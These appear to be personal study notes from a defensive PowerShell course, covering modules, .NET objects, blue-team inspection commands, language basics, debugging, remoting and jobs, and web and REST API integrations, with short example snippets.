# 1.3 Knowing Powershell
## #Modules

### Where are they stored:

`$env:psmodulepath` will show you where powershell modules are stored by default, this is where powershell will look for modules when you type in command

### How to install:

- look for registered Microsoft repos:
    - `find-module -name *ScriptAnalyzer*`
    - `install-module name PSScriptAnalyzer`
- other commands include `update-module` and `save-module` (to prevent accidental malicious code module)

NOTE: vet the modules that are installed to prevent a supply chain attack

* * *

## Find Commands:

- allows for searching of commands that exist within remote modules
- does not accept wildcards
- `find-command enable-sshremoting`

* * *

## Integrated .NET

### Syntax to call .NET from PowerShell

- \[.NET Class\]::Method(Property)
- Example:

```Powershell
PS C:\Users\Student> $base64 = "SGVsbyBXb3JsZA=="
PS C:\Users\Student> $convertedstring = [System.Convert]::FromBase64String($base64)
PS C:\Users\Student> [System.Text.Encoding]::ASCII.Getstring($convertedstring)
Helo World
```

### How to find out which one to use:

**Use web:**

- https://docs.microsoft.com/en-us/dotnet/api/?view=netcore-3.

**Use Local:**

- To drill into specific methods available within various classes, the `[classname].GetMethods()` syntax provides
    this insight. For example, if interested in the `System.Net.Http.HttpClient` class and looking to understand
    methods available in this class, the following syntax can provide additional information:

```Powershell
[System.Net.Http.HttpClient].GetMethods() | Select-Object -Property Name -Unique
```
* * *

## Object Oriented Programming

### What is an object

- An object is an **instance** of a \*\*class \*\*
- Two primary features exist:
    - **Properties** ( attributes of an object)
    - **Methods** (functions/actions associated with an object)

**Example Below:**

<img src="../../../_resources/559ffd62535df58a5317ef22c9704d1f.png" alt="559ffd62535df58a5317ef22c9704d1f.png" width="531" height="155" class="jop-noMdConv">

* * *

## .NET Objects

### **Examples:**

Get-process returns .NET objects represeting running processes

- Path, Process ID, and other properties available
- .NET methods like kill(), Pause() also available

![d850024ed46dbb67a714f8db864470eb.png](../../../_resources/d850024ed46dbb67a714f8db864470eb.png)

### How to find out what properties/methods available:

- `<cmdlet> | get-member` will show all properties and methods for this command, you then can make a variable like show above and use one of those methods/properties with it
- link for finding out what "get-method" results mean is here: https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.psmembertypes?view=powershellsdk-7.0.0

* * *

## Select-Object

**Use to filter a cmdlet through a pipeline and only show the properties specified**
### example:
```Powershell
PS C:\Users\Student> Get-Process | Select-Object -property name,path

Name                                     Path
----                                     ----
AnalyticsSrv                             C:\Program Files (x86)\Citrix\ICA Client\Receiver\A…
ApplicationFrameHost                     C:\Windows\system32\ApplicationFrameHost.exe
armsvc                                   C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\a…
audiodg                                  C:\Windows\system32\AUDIODG.EXE
```

use `-unique` or `-first/-last <number>` to modify what's shown for testing purposes:"

```powershell
PS C:\Users\Student> Get-Process | Select-Object -first 5 -unique name,StartTime

Name                 StartTime
----                 ---------
AnalyticsSrv         22/05/2023 9:48:02 AM
ApplicationFrameHost 22/05/2023 9:48:11 AM
armsvc               22/05/2023 9:47:28 AM
audiodg              22/05/2023 9:48:10 AM
AuthManSvr           22/05/2023 10:11:04 AM
```

### How do i find these "select-object" properties?

use `Select-Object –Property *` to display all properties (Displays array contents or displays all embedded object properties)

To drill in even further use `select-object -expandproperty <property_name>`

NOTE: Get-Member will show this data about the type but does not show the specific values

* * *

## Add-member

If a object doesn't have the properties you might want (e.g a virus total score, or the person who started the process) you can add it with `add-member` cmdlet:

```Powershell
PS C:\> $bitsService = Get-Service -Name BITS
PS C:\> $bitsService | Add-Member -MemberType ScriptProperty -Name
UserAccount -Value { Get-CimInstance -ClassName Win32_Service | Where-
Object {$_.Name -eq $bitsService.Name} | Select-Object -ExpandProperty
StartName}
PS C:\> $bitsService.UserAccount
LocalSystem
```

NOTE: this only applies to the specific object and not the type, `update-typedata` is used to update properties and methods available to all instances of this type (e.g it will affect all get-process objects). HOWEVER this only applies t the current powershell session, subsequent session will have no knowledge of this change.  For **permanence**, Update-TypeData may be used in conjunction with XML configuration files to permanently extend types within PowerShell.

* * *

## Update-typedata

Example:

```powershell
update-typedata -typename system.serviceprocess.serviceconrtoller - 
MemberType ScriptProperty -MemberName UserAccount -Value { Get-
CimInstance -ClassName Win32_Service | Where-Object {$_.Name -eq
$bitsService.Name} | Select-Object –ExpandProperty StartName}
```

NOTE's:

- this only saves the configurations to the current ps session
- this .net framework (system.serviceprocess.servicecontroller) is the function that get-service uses, to find this out so you can modify it using the update-typedata command use the `<cmdlet> | get-member one liner`
- to make this permanent, leverage the XML-based extension files or add the Update-
    TypeData implementation to the $Profile script.




# 1.4 Blue Team use Cases
## Formatting Output

- `format-table -autosize` for quick human readability
- `format-list` for no truncation of output = more verbosity

If desired, default output formatting can be modified entirely. Per PowerShell documentation, the recommended approach to override default behavior is to create a custom format definition file named Format.ps1xml where an
XML-based definition is used to specify exactly how output should be formatted on a per-type basis. Overrides can be tweaked per data type for all objects of interest. Creating a custom format file can be easily accomplished by using the Get-FormatData cmdlet, which will return format definitions and can be scoped to only specific data types. Export this to an XML file with Export-FormatData. With the file on disk, it can be modified with a text/XML editor. The XML format is verbose and intuitive for making modifications. Once modifications are made, the Update-TypeData cmdlet can be used to update the default output behavior for overridden types. Since this is a per-session change, the Update-TypeData command execution can be added to the PowerShell profile to ensure persistence

- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_format.ps1xml?view=powershell-7.1#sample-xml-for-a-format-table-custom-view
- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/format-table?view=powershell-7.1
- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/format-list?view=powershell-7.1

* * *

## Get-Hotfix (patch checking)

`Get-HotFix | Sort-Object -Property InstalledOn -Descending`

If the latest “InstalledOn” property is several months out of date, it is possible that the system has critical vulnerabilities, and that the automated patching mechanism isn't working properly

* * *

### Analyzing Drive Contents

Example: Find all .dll files under C:\\Windows\\System32

- `Get-ChildItem -Path C:\windows\system32 -Filter "*.dll" -Recurse`

and

- `get-psdrive` lists drives that can be interrogated

<img src="../../../_resources/258f33acab3241a67d0f18107c98887d.png" alt="258f33acab3241a67d0f18107c98887d.png" width="523" height="228" class="jop-noMdConv">

- investigate [[Certs]] with `get-childitem cert:\` same goes for other random directories

* * *

## Analyzing Items and their Properties

- `get-item`
- `get-itemproperty` (last write time etc)
- `get-content -path <file_path> -stream zone.identifier` - this finds out where the file was downloaded from 
- `select-string -pattern <some_pattern>` this can be used like 'grep' to search for content in files from `get-content` pipeline without loading entire file into memory (can be adjusted with `-readcount` )

***
## Writing to files
- `tee-object` can be used in pipeline to output to a file, e.g:
	- `PS C:\> Get-Process | Tee-Object -FilePath "C:\temp\processes.txt" |
Where-Object {$_.Name -eq 'notepad'}`
 - `outfile` can be used in pipeline also
 - redirection operators:
	 - `>` (write)
	 - `>>` (append)
***
## CSV-Based Reporting
```Powershell
PS C:\> Get-Process | Select-Object -Property Name,Path,Parent | Export-
Csv -Path C:\temp\proc.csv
PS C:\> $processBaseline = Import-Csv -Path C:\temp\proc.csv
PS C:\> $processBaseline | Select-Object -First 1 | Format-list
```
output:
```powershell
Name : ApMsgFwd
Path : C:\Program Files\Alps\GlidePoint\ApMsgFwd.exe
Parent : System.Diagnostics.Process (Apoint)
```

***
## Copying files
 - `copy-tem` is the command
	 - `-filter` parameter alows for wildcards
	 - `-fromsession` & `-tosession` alows for remote copy
	 - `-Path` specifies source and `-Destination` defines target for copy
***
## Inspecting Network Details
 - `Get-NetAdapter` lists the network adapters on a system
 - `Get-NetIPAddress` lists additional details for each interface
 - god for diagnosing why users internet traffic might not be logging therough proxies
***
## #Get-CimInstance / #Get-WmiObject
 - `get-ciminstanc` & `get-wmiobject` allow for interacting with Operating System components not directly accessible with PowerShell cmdlets
 - CIM (Common Information Model) cmdlets are preferred
 - WMI not available iwht powershell 7
 - Scenario: Which user profiles exist on this system?
```Powershell
PS C:\> Get-CimInstance -ClassName win32_userprofile | Select-Object LocalPath
LocalPath
---------
C:\Users\jj
```
**References:**
 - https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/get-ciminstance?view=powershell-7.1
 - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1
 - https://adamtheautomator.com/powershell-delete-user-profile

# 1.5 Language Basics
## #Variables
 - variables are case insensitive
 - variables with spaces can be made with `${my variable}`
 - custom drive named "variable:" contains list of all variables within session
	 - list with: `get-childitem variable:`
***
## Variables - $_ (or $PSItem)
 - $_ references current object on the pipeline.

***
## Changing #DataTypes (int to string etc)
 - `[String]$ProcessID = 9901` - This now has changed the default integer type of $Processid to a string
 - From here then we can modify the value with string data type functions lke concatenation, example:

```Powershell
PS C:\> [String]$ProcessID = 9901  
PS C:\> $ProcessID += " - Known malicious"  
PS C:\> $ProcessID  
9901 - Known malicious
```

## Escape Sequences
Common use cases:
![[Pasted image 20230523173310.png]]

## Collections
### Arrays

 - Instantiated via assigning multiple values to a variable
 ```Powershell
 $myArray = 1,2,3,4,5
```
 - Or using the array operator @()
```Powershell
 $myArray = @(1,2,3,4,5)
```
 - Arrays can store instances of one or more data types (note calling `$myarray[2]` will output the result of the `get-process` cmd )
``` Powershell
$myArray = @(1,"2",(Get-Process pwsh))
```
 - Elements can be accessed by index
```Powershell
$myArray[0] #returns first element in the array - 1
```
### ArrayLists
 - Better performance when modifying array
```Powershell
$myHoneyPorts = New-Object System.Collections.ArrayList
```
 - Add elements with the `.add()` or `.addrange()` methods
```powershell
$myHoneyPorts.AddRange(@("21","22","23","25","53","80","110","135"))
$myHoneyPorts.Add("1433“)
```

 - Remove elements with the `.Remove()` Method
 ```Powershell
 $myHoneyPorts.Remove("22“)
```

### Hash Tables

 - Allows for key/value pairs
 - Create a hash table via shorthand OR .NET type reference
```Powershell
$myHT = @{Key1="Value1";Key2="Value2"} # Default initialization
```
OR
```Powershell
$myCSHT = New-Object System.Collections.Hashtable # Case sensitive keys
```
 - Find a value based on key
 ```Powershell
 $myHT['key1'] # Will Output 'Value1'
```
 - List keys and values via dot-notation
 ```Powershell
PS C:\> $myHT.Keys  
Key1  
Key2  
PS C:\> $myHT.Values  
Value1  
Value2
```


## Constructing #Strings
 Double quotes permit:
 - Variable substitution 
```Powershell
Write-Output "Current workstation name is $env:COMPUTERNAME"  
Current workstation name is wks-01
```
 - complex expressions inside the string
 
 - Single quotes ensure **literal interpretation** of characters in a string
 ```Powershell
Write-Output 'Current workstation name is $env:COMPUTERNAME'  
Current workstation name is $env:COMPUTERNAME
```

## Conditional Statements (syntax)
 - if/else:
```Powershell
if($a -eq 10){"a=10"}elseif($a -eq 9){"a=9"}else{"a is not 9 or 10"}
```
 - Valid Logical Operators: -and, -or, -xor, -not
	 - -not can also be expressed with !


## #Switch Statements
 - Multiple conditions can match, and all associated script blocks will execute
 - Regex/Wildcard support for complex string matching
 - switch statements are good for an alternative to a bunch of if/else statements (""...Multiple conditions can match..."")
 ```Powershell
$a=10  
switch($a){  
	10 {"a=10" ; Break}  
	{$a –gt 8} {"a is greater than 8" }  
	default {
	“a is less than 7"
	}  
}  
#output will be 'a=10'
```
## #Where-Object
 - Normal `where-object` cmd:
```Powershell
Get-Service | Where-Object {$_.Status -eq "Running"}
```
 - Now, expanded out, this cmd would look like:
```Powershell
$Services = Get-Service  
foreach($Service in $Services){  
	if($Service.Status -eq "Running"){  
		$Service  
}}
```

 - enables single line execution of the above function
## Comparison operators

![[Pasted image 20230523183447.png]]





## Loops
 - Common loops like `for, foreach, while, do while,do until`,  etc. are supported
 - `-parrallel` parameter allows multi-threading
 - For loop:
```Powershell
for($i=0;$i -lt $x; $i++){ "Execute step $i" }
```
 - While Loop
```Powershell
while($condition -eq $true) { "Loop operation" }
```
 - ForEach loop
```Powershell
foreach ($thisobj in $thiscollection) {"Operation processing $thisobj"}
```
 - Do While loop:
```Powershell
do { "Loop operation" } while ($condition -eq $true)
```

 - Do until loop
 ```Powershell
do { "Loop operation" } until ($condition -eq $true)
```




## Functions
#functions
 - Functions must be defined prior to code that calls them
 ```Powershell
Function Find-Evil {
	Param($cn,$ioc)  
}  
Find-Evil $cn $ioc
```
 - Advanced functions (cmdlets written in PowerShell) leverage the  `[CmdletBinding()]` attribute
	 - Attribute enables parameters such as –Verbose and -Debug

### Inputs
#param
Example1:
```Powershell
Function Find-Evil { Param($computerName) }
```
Example2:
```Powershell
Function Find-Evil {  
	Param(  
		[Parameter(Mandatory=$true,ValueFromPipeline=$true)]  
		[ValidateLength(8,10)]  
		[string]$computerName)  
}
```
Call function with:
```Powershell
Find-Evil -computerName "tst-01234"
```
If variables need to be passed
 - Example1:
```Powershell
Function Find-Evil ($computerName,$indicator){}
```
 - Example2 (recomended):
```Powershell
Function Find-Evil { param($computerName,$indicator) }
```

### Pipeline Orientation and –Begin –Process –End
 - *Begin* specifies code to run once ahead of executing the pipelined objects
 - *Process* Specifies code to run for each object received on the pipeling
 - *End* specifies code to run after all objects have been received by  pipeline
 ```Powershell
Function find-malicioushashes {
	begin{  
		Write-Output "Starting processing"  
		$indicators = Get-Content -Path C:\temp\indicators.txt
		}
		Process{  
			if($indicators -contains (Get-FileHash $_ | Select-Object - ExpandProperty Hash)){  
				Write-Output "Found malicious file $_" } }  
		End{  
			Write-Output "Finished processing files"  
		}}
```
## #Scopes
![[Pasted image 20230524173554.png]]
 - If you want to have the variables inside a powershell script  in your session use this:
```Powershell
PS C:\> . .\Find-MaliciousHashes.ps1
```


## Script Blocks
 - use { Braces }
Example:
```Powershell
$AdminDiscoverySB = {  
	Get-LocalGroupMember -Group Administrators | Where-Object {  
	$_.PrincipalSource -eq "Local" } | ForEach-  
	Object { $_.Name.split('\')[1] } | Get-LocalUser  
}  
Invoke-Command -ComputerName $Target -ScriptBlock $AdminDiscoverySB
```


## Reading Input
 - Parameters allow for input to cmdlests, functions etc
	 - Useful for non-interactive execution such as scheduled tasks
• Console input can be read with the Read-Host cmdlet
	• Pauses execution until user supplies input and hits enter
	• Results stored as SecureString object with -AsSecureString parameter
	• Results can be stored in variable for later use
```Powershell
$process = Read-Host -Prompt "Which process do you want to monitor?"
#Which process do you want to monitor?: notepad
#PS C:\> $process
#notepad
```

## Writing #Output: #Streams

```Powershell
Get-FileHash C:\nonexistent.txt 2> C:\temp\errorlog.txt  
cat C:\temp\errorlog.txt  
#Get-FileHash: Cannot find path 'C:\nonexistent.txt' because it does not  exist.
```

| Steam number | Purpose        |
| ------------ | -------------- |
| 1            | Success/Output |
| 2            | Error          |
| 3            | Warning        |
| 4            | Verbose        |
| 5            | Debug          |
| 6            | Information    |


# 1.7 Debugging
## #StrictMode
`set-strictmode -version latest` sets the current session to strict mode
this then will tell you if you have made any mistakes like a typo in a variable instead of null output
 - good to make script rock solid before deployment
## #Set-PSDebug
 - allows for globally configured strict mode
 - Trace Level 1 – Trace each line upon execution  
 - Trace Level 2 – Trace each line and show variables’ state and function calls
 - has stepping function (will pause at each error message line)
	 - `-step`
 - good for debugging however very verbose and lots of noise
## #Set-PSBreakpoint

 - Flexible debugging on a number of conditions:  
 - Line number is hit  
 - Column in line number is hit  
 - Command or function invoked  
 - Variable is read/modified  
 - Default
## #PSScriptAnalyzer
Microsoft-developed and maintained static code analysis tool
```Powershell
invoke-scriptanalyzer -path .\demo-psdebug.ps1
```
![[Pasted image 20230524214422.png]]



## #Pester
`Install-Module Pester -Force`
&
`Invoke-Pester -Path testfilename.Tests.ps1`

![[Pasted image 20230524215817.png]]


# 2.1 Best Practices
Book2:Chapter1
## #PsCustomObject
 - PSCustomObject type accelerator turns a hash table into an object
```Powershell
Function Get-IPAddressOfUser ($UserName){
[PSCustomObject]@{Username="jj";IPAddress="10.5.86.10"}  
}
#PS C:\> $jjUser = Get-IPAddressOfUser -UserName "jj"  
#PS C:\> $jjUser.IPAddress  
#10.5.86.10
```
## #CIM Versus #WMI
 - WMI cmdlets are deprecated and no longer being developed
 - Still available in Windows PowerShell
 - No longer exist in PowerShell Core  
 - Refactor code early to avoid compatibility issues long-term
 - CIM cmdlets use WS-MAN versus DCOM/RPC 
 - Similar functionality with minor syntax differences  
 - standard WinRM ports need to be enabled  
versus handling RPC connections across a firewall
```Powershell
Get-WmiObject -ComputerName (<target>) -Class <class>  
#vs
Get-CimInstance –CimSession (New-CimSession –ComputerName
<target>) –ClassName <class>
```


## #Try / #Catch / #Finally
Book2:page18 
 - try { } code blocks include code that may encounter error
 - catch { } code blocks include code to execute upon error
 - finally { } code blocks include code to execute regardless of error
Example:
![[Pasted image 20230525121853.png]]
## Terminating #Errors in PowerShell
Book2:Page19
 - Terminating errors end execution and can be ‘caught’ in catch block  
 - Non-Terminating errors will not hit catch block  
 - Must update Error Action option via one of two methods:  
	 - Inside script or context requiring try/catch, update $ErrorActionPreference  
	 - `$ErrorActionPreference = "Stop"  `
	 - Set -ErrorAction Stop on commands that may result in errors  
	 - `Get-Content C:\baselines\baseline.csv -ErrorAction Stop`  

# 2.2 Remote Management
## Overview
PowerShell's primary remoting technology leverages standard HTTP-based connections over consistent ports.  
This is built on top of **WSMan and runs on ports 5985 (HTTP) and 5986 (HTTPS)** by default. However, even  
without PowerShell Remoting set up, Windows PowerShell users can still leverage RPC-based remoting built into  
many cmdlets. Also has Cross-Platform remoting with SSH in PowerShell Core.
## Find all remoting commands
Book2:Page25-26
Use the command below to identify cmdlets that implement their own remoting:
```Powershell
Get-Command | Where-Object { $_.parameters.keys -contains "ComputerName" -and $_.parameters.keys -notcontains "Session"}
```
Note: 
	Cmdlets with their own remoting perform all processing of the command locally on the calling computer, and  they use the remoting technologies implemented to go retrieve the data being requested.
	.
	On the other hand, PS  Remoting offloads all processing to the remote computer where the data can be requested, filtered, and  massaged remotely
	.
	Lastly, native remoting within cmdlets may not support a -Credential parameter to run with alternate  credentials. Invoke-Command, and the PSSession cmdlets always support this useful feature.
## Remoting Encryption
 - By default, PS Remoting sends cleartext HTTP WinRM messages
	 - However, payloads of #WS-MAN #SOAP messages are encrypted via AES-256  
 - SSL can also be leveraged to encapsulate entire request in HTTPS  
	 - Can be used to protect HTTP headers to limit information disclosure
Implementing HTTPS requires a certificate with the “Server Authentication” capability and the system  
hostname must match the CN in the certificate. Once certificates are in place, the following command enables  
HTTPS-based transport
```Powershell
winrm quickconfig -transport:https
```
## Invoke-command
#invoke-command
### Arguments  
 - `Invoke-Command -ScriptBlock  `
	 - Specifies command or block of code to execute remotely  
 - `Invoke-Command –FilePath ` 
	 - Specifies entire .ps1 script to run remotely  
 - `Invoke-Command –Credential  `
	 - Specifies alternate credential to use for authenticating the remote session  
 - `Invoke-Command –ThrottleLimit ` 
	 - Controls number of concurrent requests
### Output
Invoke-command returns .NET objects, however, returned objects are slightly modified and `methods` are removed. 
Data Type is `Deserialized.<Type>`  (e.g.,Deserialized.System.Diagnostics.Process)

Looking at the  object with Get-Member, the data type will be prefixed with `"Deserialized".<TYPE>` which is a clear  
indication that the object has undergone this modification during transit.
## Invoke-command jobs
#jobs
`Invoke-Command –AsJob`
 - Allows for backgrounded, parallel execution of tasks  
 - Holds results of remote commands until they can be retrieved

This will start a connection to a remote computer and immediately background it as a job object. From here the job can be called later in the script for ease of use.

## Passing Input to Remote Script Blocks
### Option 1(`$using` variable):
When passing a script bloke remotely all the variables created before the script block wont be usable by the target system because the target system has no knowledge of these variables. This can be fixed by using the `$using` #Scope Modifier. This will make the variable available in remote sessions, example:
```Powershell
$ProcessToHunt = "someMaliciousProcessName"  
$Computers = "wks01","wks02"  

Invoke-Command -ScriptBlock { Get-Process -Name $Using:ProcessToHunt - ErrorAction SilentlyContinue } -ComputerName $Computers
```
### Option2(`-argumentlist` parameter):
retarded other way to do it below:
```Powershell
$ProcessToHunt = "someMaliciousProcessName"  
$Computers = "wks01","wks02"  
$SB = {  
Param($ProcessName) #Parameter to scriptblock  
Get-Process -Name $ProcessName -ErrorAction SilentlyContinue  
}  
Invoke-Command -ScriptBlock $SB -ArgumentList $ProcessToHunt -  
ComputerName $Computers
```


## Remoting Sessions
`Invoke-command` takes care of the following tasks:
1. Builds the remoting session  
2. Executes command(s) and returns output  
3. Tears down the remoting session

`-pssession` cmdlets meet additional remoting requirements
 - Work with specific object of type:  
`System.Management.Automation.Runspaces.PSSession`

The process of always using `invoke-command` can **add significant overhead** if a workflow/script is constantly calling Invoke-Command against  the same remote system. An alternative is to create a persistent PS Remoting session on the remote computer,  and then execute commands within that session

NOTE: *you can store `PSSession` objects inside variables within PowerShell. These objects can be passed between functions, stored, retrieved, etc., like any other variable.*
## Managing Remote Sessions 
#new-pssession
#enter-pssession
#get-pssession
#remove-pssession
#disconnect-pssession
#connect-pssession
#Receive-PSSession
### Commands
 - `new-pssession` creates remote sessions
	 - Allows for reuse of established remote sessions  
		 - Remote sessions stay alive  
		 - `Invoke-Command` would need to rebuild session in each instance  
 - `Enter-PSSession` accepts a -Session parameter to enter into remote session  
 - `Get-PSSession` lists existing sessions  
 - `Remove-PSSession` terminates an existing session
 - `disconnect-Pssession` disconnects sessions but preserves state
	 - `IdleTimeOutSec` specifies the length of time for a session to live while  idle (Default: 2 Hours)  
	 - `OutputBufferingMode` specifies how to handle output when the output buffer is full (Default: Block)  
		 - Block: Pause command execution  
		 - Drop: Continue execution, but implement FIFO queue on the output
 - `connect-Pssession` reestablishes connection
 - `Receive-PSSession` can be used to retrieve the output of remote  commands in disconnected sessions

```Powershell
$mySession = New-PSSession -ComputerName .  

$mySession

Enter-PSSession -Session $mySession  

#[localhost]: PS C:\Users\jcjohnson\Documents>
```

### Session Options
#New-PSSessionOption
 - Session options define user-controllable settings for remoting
	 - `New-PSSessionOption` defines remote session configurations  
		 - Include settings such as:  
		 - Proxy settings for WinRM traffic  
		 - Timeout settings for the session
Example:
![[Pasted image 20230525154012.png]]

User Profile Creation:
 - Powershell remoting sessions create user profiles on target systems
 - persistent profile may not be needed and clutter user's directory
 - Adversary on endpoint may monitor for signs of detection  
	 - Profile for an administrative security account may tip hand  
 - `New-PSSessionOption` has `-NoMachineProfile` flag to avoid  creating a new profile  
	 - Can be embedded directly into Invoke-Command and `-PSSession`  cmdlets
### Templating remote sessions
#New-pssessionconfigurationfile 
#register-pssessionconfiguration
#Set-PSSessionConfiguration
#JEA
#`Get-PSSessionConfiguration`
 - `new-pssessionconfigurationfile` creates plaintext sessions configuration file to determine an endpoint
 - `register-pssessionconfiguration`
 - `Set-PSSessionConfiguration` updates session configuration  
 - `Get-PSSessionConfiguration` lists existing endpoints
 - `Enter-PSSession -ConfigurationName <endpoint>`  leverages the new session configuration
Use custom configs to lock down remote access for approved users (JEA)

### Implicit Remote Sessions – Import-PSSession
#import-pssession
Implicit remoting sessions allow remote commands to run locally.
For example, if get-aduser not available locally use this method
example:
```Powershell
import-pssession -session $remotingsession -module Active Directory
```

### Enabling Remoting
#### Manual Process
Book2:Page53
#enable-psremoting
#winrm #quickconfig
In powershell run `enable-psremoting`
 - Performs several management tasks to permit remoting  
 - Will throw an error if network connections of type ‘Public’ exist
	 - Either modify network connection types to “Private”  
		 - Or use –SkipNetworkProfileCheck switch  
			 - Caution: This allows PS Remoting from local subnet addresses on networks defined  as Public

OR

In cmd.exe run `winrm quickconfig`

#### Group Policy
1. Enable WinRM Service and allow remote connections  
```Misc
Computer Configuration > Policies > Administrative Templates > Windows Components > Windows Remote  
Management (WinRM) > WinRM Service > Allow remote server management through WinRM
```
2. Set Windows Remote Management service to automatic startup  mode  
```Misc
Computer Configuration > Policies > Windows Settings > Security Settings > System Services > Windows  
Remote Management (WS-Management)  
```
3. Create Windows Firewall rule to permit WinRM  
	 - Inbound rule wizard includes predefined rule for this setting
```misc
Computer Configuration > Policies > Windows Settings > Security Settings > Windows Firewall with  
Advanced Security
```

### SSH Setup Steps for Windows  
#SSH
#sshtransport
High-Level Overview (Details in notes)  
• Install PowerShell Core 6 or later (pwsh.exe)  
• Install OpenSSH on Windows  
• Configure PATH and SSHD Config  
• OpenSSH must have PowerShell listed as a subsystem  
• Restart SSHD  
• Enter remoting Session
```Powershell
enter-pssession -hostname $target -username itsec -SSHtransport
```

### Double-Hop Workarounds
Book2:Page59
#double-hop
 - Kerberos Delegation (Several types)
	  - Unconstrained Delegation – no control of how delegated credentials are reused  
	  - Constrained Delegation – Specify target SPNs where delegation may occur  
	  - Resource-Based Constrained Delegation (Server 2012+)  
		  - Involves AD changes to computer account properties for each remoting scenario
```Powershell
Set-ADComputer -Identity $TargetServer -PrincipalsAllowedToDelegateToAccount $(Get-ADComputer -Identity $IntermediateServer)
```

OR 

 - custom Powershell session configurations with "RunAs"
	 - Pass ‘RunAsCredential’ to Register-PSConfigurationFile  
	 - Similar concept to SUID in UNIX environments, but applies to sessions  
	 - All commands execute as RunAs user

OR 

#JEA endpoints with Group Managed Service Accounts (gMSAs) can access network resources  on behalf of remoting user.

OR

Embeded credentials using the `get-credential ` cmdlet and saving as variable. This also requires you to use the `$using:` variable scope modifyer to pass variables through. Example:
```Powershell
$cred = get-credential
$targetserver = "dc01"
$intermedserver = "files"

invoke-command -computername $intermedserver -credential $cred -scriptblock { invoke-command -computername $targetserver -credential $using:cred -scripblock {get-process}}
```


# 2.3 Powershell Performance
## Creating a PowerShell Job: Start-Job
#jobs 
#start-job 
`Start-job` cmdlet creates new job, once executed it will run the command in the background
Start-job parameter list

| Parameter            | purpose |
| -------------------- | ------- |
| Name                 |   Names the job so that it can be looked up by this key later      |
| Scriptblock          |    Defines the code to run in the background job     |
| filepath             |     Specifies a script to run in the background job    |
| Initializationscript |     Script Block to execute before the job starts (useful for importing modules)    |
| argumentlist         |     parameters to feed to the job    |
| credential           |    authentication via PSCredential object     |

### Check status of a job
#get-job
Checking status of specific job
`get-job -name jobname`
Check status of all jobs
`get-job`

## Wait-job
#wait-job
  
• `Wait-Job -Any` waits until any of the specified jobs are completed  
• `Wait-Job –Name` or `–Id` specifies specific jobs  
• `Wait-Job –Timeout` specifies a maximum time to wait
## Retrieve Job
Book2:Page 85
#receive-job
## Remove Job (cleaning up)
Book2:Page 
#remove-job
`remove-job`
# 2.4 Integrations
## Web Scraping
#invoke-webrequest
  - Web Scraping  
  - HTTP APIs  
	  - SOAP  
	  - REST  
  - Notifications
	  - Email/SMS/Web Hook  
  - Custom PowerShell Modules  
  - Raw TCP/UDP connections
 
 - Invoke-webrequests makes HTTP requests and returns a .NET object (mshtml.IHTMLDocument2 object as a property named ParsedHtml)

Invoke-WebRequest usage:

| Parameter       | Usage |
| --------------- | ----- |
| Uri             | URL being requested      |
| Method          |HTTP Method being used       |
| Credential      | Automatically respons to a 401 response and authenticates the request with specified credentials      |
| Headers         | Hash table of headers to be used within powershell      |
| SessionVariable |Stores returned session tokens in a powershell environment       |
| WebSession      | Reuses session tokens from a session variable within the request       |
| Certificate                | Specifies client certificate for authenticating a request       |

 - Powershell core uses "usebasicparsing" and doesn't use the IE engine. Normal Powershell uses the IE engine and has more functionality

Example:
![[Pasted image 20230530101205.png]]

```Powershell
$diary = Invoke-WebRequest -Uri "https://isc.sans.edu/diaryarchive.html“
$diary.ParsedHtml.body.getElementsByClassName("`$rowstyle") | Select-
Object -ExpandProperty innertext
```

### Forms
Book2:Page119
![[Pasted image 20230530101637.png]]

### .NET for web scraping

```Powershell
#The following command will completely  suppress progress bars
$ProgressPreference = 'SilentlyContinue'  
#To make a request with .NET, first create a new instance of the System.Net.WebClient class.  
$webClient = New-Object System.Net.Webclient  
#Next, use one of the download methods available in this class (e.g., DownloadString()) and specify the target  URL. By storing the content in a variable, it can be analyzed by PowerShell.  
$result = $webClient.DownloadString('https://www.sans.org')  
#Lastly, clean up the object by running the Dispose() method.  
$webClient.Dispose()
```

## HTTP APIs
Book2:Page123
#new-webserviceproxy
 - Web Service Definition Language  
( #WSDL )
 - Active Server Methods ( #ASMX 
![[Pasted image 20230530103147.png]]

### REST Services
#invoke-restmethod
Book2:Page128
REST services are exceedingly popular in security products versus  
traditional SOAP-based web services  
• Simple HTTP requests to read/write data  
• Machine readable, easily parsed response bodies  
• Common data formats – typically JSON  
• PowerShell has a dedicated cmdlet for REST Services  
• Invoke-RestMethod  
• Strong support for conversion of JSON to/from PowerShell objects

Example:
```Powershell
$googleApi = "https://safebrowsing.googleapis.com/v4/threatMatches:find?key=" + $apiKey 
$url = "http://malware.testing.google.test/testing/malware/“  
$postBody = '{"client":{"clientId":"JJ","clientVersion":"1.5.2"},"threatInfo":{"threatTypes ":["MALWARE","SOCIAL_ENGINEERING"],"platformTypes": ["WINDOWS"],"threatEntryType  s":["URL"],"threatEntries":[{"url":"'+$url+'"}]}}’  
$results = Invoke-RestMethod -Uri $googleApi -Method Post -ContentType 'application/json' -Body $postBody  
$results.matches
```

![[Pasted image 20230530104007.png]]
#### Building a POST Body
 - APIs often require POST bodies in JSON format
	 - Manually constructing String object works for simple requests  
	 - For larger request bodies, convert a PowerShell object to JSON  
	 - ConvertTo-Json makes this simple
```Powershell
obj = new-object psobject
$obj | Add-Member -PassThru NoteProperty coursenumber "SEC586"  
$obj | Add-Member -PassThru NoteProperty coursename "Defensive  PowerShell"  
$obj | ConvertTo-Json -Compress {"coursenumber":"SEC586","coursename":"Defensive PowerShell"}
```
### Cookie-based Session mangement
#sessionvariable
 - `Invoke-webrequest` and `Invoke-restmethod` support `SessionVariable` parameter
 - Specifies a variable to populate with the session tokens in the  server response  
 - Do not include the $ sign when defining this variable  
 - WebSession parameter can then be used in subsequent requests  to submit session tokens
Example:
![[Pasted image 20230530105115.png]]

### Token-Based Authentication
 - API Key in URL (e.g., Google SafeBrowsing)
	 - `$u="https://safebrowsing.googleapis.com/v4/threatMatches:find?key=$key"`  
 - HTTP Authorization Header  
	 - `$headers = @{ "APIKey" = $APIKey}`  
	 - `$result = Invoke-RestMethod -Headers $headers -Uri $url`  
 - Basic auth or Bearer token (PowerShell Core 6+)  
	 - Token must be presented as a SecureString  
